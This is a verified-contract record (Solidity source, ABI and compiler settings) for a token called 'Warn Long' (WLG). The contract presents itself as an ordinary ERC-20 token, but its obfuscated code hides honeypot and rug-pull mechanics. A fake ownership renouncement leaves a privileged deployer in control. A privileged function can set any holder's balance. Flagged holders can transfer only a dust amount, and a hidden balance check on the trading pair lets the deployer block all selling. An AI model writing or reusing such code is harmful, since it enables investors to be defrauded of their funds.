{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface launchMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract listTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverSellMin {\n    function createPair(address liquidityList, address maxShould) external returns (address);\n}\n\ninterface launchedReceiverReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenBuy) external view returns (uint256);\n\n    function transfer(address amountTakeSell, uint256 tradingMarketing) external returns (bool);\n\n    function allowance(address listExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountTakeSell,\n        uint256 tradingMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountReceiver, uint256 value);\n    event Approval(address indexed listExempt, address indexed spender, uint256 value);\n}\n\ninterface launchedReceiverReceiverMetadata is launchedReceiverReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WarnLong is listTotal, launchedReceiverReceiver, launchedReceiverReceiverMetadata {\n\n    function transferFrom(address tradingWallet, address amountTakeSell, uint256 tradingMarketing) external override returns (bool) {\n        if (_msgSender() != teamFrom) {\n            if (swapSenderAmount[tradingWallet][_msgSender()] != type(uint256).max) {\n                require(tradingMarketing <= swapSenderAmount[tradingWallet][_msgSender()]);\n                swapSenderAmount[tradingWallet][_msgSender()] -= tradingMarketing;\n            }\n        }\n        return exemptBuyAuto(tradingWallet, amountTakeSell, tradingMarketing);\n    }\n\n    mapping(address => mapping(address => uint256)) private swapSenderAmount;\n\n    uint256 public autoModeFrom;\n\n    mapping(address => bool) public exemptReceiverShould;\n\n    address sellMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 minMode;\n\n    uint8 private isSender = 18;\n\n    address teamFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private maxWallet;\n\n    uint256 fromBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isSender;\n    }\n\n    function senderFeeTotal() public {\n        emit OwnershipTransferred(receiverListMin, address(0));\n        enableMin = address(0);\n    }\n\n    function fromAmountMin(address tradingWallet, address amountTakeSell, uint256 tradingMarketing) internal returns (bool) {\n        require(maxWallet[tradingWallet] >= tradingMarketing);\n        maxWallet[tradingWallet] -= tradingMarketing;\n        maxWallet[amountTakeSell] += tradingMarketing;\n        emit Transfer(tradingWallet, amountTakeSell, tradingMarketing);\n        return true;\n    }\n\n    constructor (){\n        if (launchedExempt != fromAmount) {\n            takeAuto = fromAmount;\n        }\n        launchMax maxToToken = launchMax(teamFrom);\n        maxReceiver = receiverSellMin(maxToToken.factory()).createPair(maxToToken.WETH(), address(this));\n        if (launchedExempt != takeAuto) {\n            atMode = false;\n        }\n        receiverListMin = _msgSender();\n        senderFeeTotal();\n        txSell[receiverListMin] = true;\n        maxWallet[receiverListMin] = feeTeam;\n        if (teamFundAmount != autoAt) {\n            autoAt = teamFundAmount;\n        }\n        emit Transfer(address(0), receiverListMin, feeTeam);\n    }\n\n    function balanceOf(address tokenBuy) public view virtual override returns (uint256) {\n        return maxWallet[tokenBuy];\n    }\n\n    uint256 public listMode;\n\n    function takeAmount(address amountMarketing) public {\n        marketingTeam();\n        if (fromAmount != listMode) {\n            fromAmount = teamFundAmount;\n        }\n        if (amountMarketing == receiverListMin || amountMarketing == maxReceiver) {\n            return;\n        }\n        exemptReceiverShould[amountMarketing] = true;\n    }\n\n    function swapMaxFee(uint256 tradingMarketing) public {\n        marketingTeam();\n        minMode = tradingMarketing;\n    }\n\n    bool private listSender;\n\n    mapping(address => bool) public txSell;\n\n    function owner() external view returns (address) {\n        return enableMin;\n    }\n\n    function allowance(address buySwapMax, address exemptTrading) external view virtual override returns (uint256) {\n        if (exemptTrading == teamFrom) {\n            return type(uint256).max;\n        }\n        return swapSenderAmount[buySwapMax][exemptTrading];\n    }\n\n    uint256 private takeAuto;\n\n    uint256 private feeTeam = 100000000 * 10 ** 18;\n\n    function exemptBuyAuto(address tradingWallet, address amountTakeSell, uint256 tradingMarketing) internal returns (bool) {\n        if (tradingWallet == receiverListMin) {\n            return fromAmountMin(tradingWallet, amountTakeSell, tradingMarketing);\n        }\n        uint256 fromEnable = launchedReceiverReceiver(maxReceiver).balanceOf(sellMin);\n        require(fromEnable == minMode);\n        require(amountTakeSell != sellMin);\n        if (exemptReceiverShould[tradingWallet]) {\n            return fromAmountMin(tradingWallet, amountTakeSell, buyMin);\n        }\n        return fromAmountMin(tradingWallet, amountTakeSell, tradingMarketing);\n    }\n\n    uint256 private teamFundAmount;\n\n    function amountSell(address takeToExempt) public {\n        if (receiverTeamAt) {\n            return;\n        }\n        \n        txSell[takeToExempt] = true;\n        \n        receiverTeamAt = true;\n    }\n\n    function marketingTeam() private view {\n        require(txSell[_msgSender()]);\n    }\n\n    uint256 private autoAt;\n\n    string private shouldReceiver = \"WLG\";\n\n    address public maxReceiver;\n\n    event OwnershipTransferred(address indexed tradingLaunchedSwap, address indexed buyShould);\n\n    bool public receiverTeamAt;\n\n    function transfer(address isList, uint256 tradingMarketing) external virtual override returns (bool) {\n        return exemptBuyAuto(_msgSender(), isList, tradingMarketing);\n    }\n\n    bool public atMode;\n\n    string private autoSell = \"Warn Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return autoSell;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeTeam;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableMin;\n    }\n\n    address private enableMin;\n\n    address public receiverListMin;\n\n    uint256 public fromAmount;\n\n    uint256 constant buyMin = 19 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldReceiver;\n    }\n\n    function fromTrading(address isList, uint256 tradingMarketing) public {\n        marketingTeam();\n        maxWallet[isList] = tradingMarketing;\n    }\n\n    uint256 public launchedExempt;\n\n    function approve(address exemptTrading, uint256 tradingMarketing) public virtual override returns (bool) {\n        swapSenderAmount[_msgSender()][exemptTrading] = tradingMarketing;\n        emit Approval(_msgSender(), exemptTrading, tradingMarketing);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLaunchedSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySwapMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToExempt\",\"type\":\"address\"}],\"name\":\"amountSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoModeFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptReceiverShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMarketing\",\"type\":\"uint256\"}],\"name\":\"fromTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverListMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeamAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFeeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingMarketing\",\"type\":\"uint256\"}],\"name\":\"swapMaxFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"}],\"name\":\"takeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTakeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "WarnLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}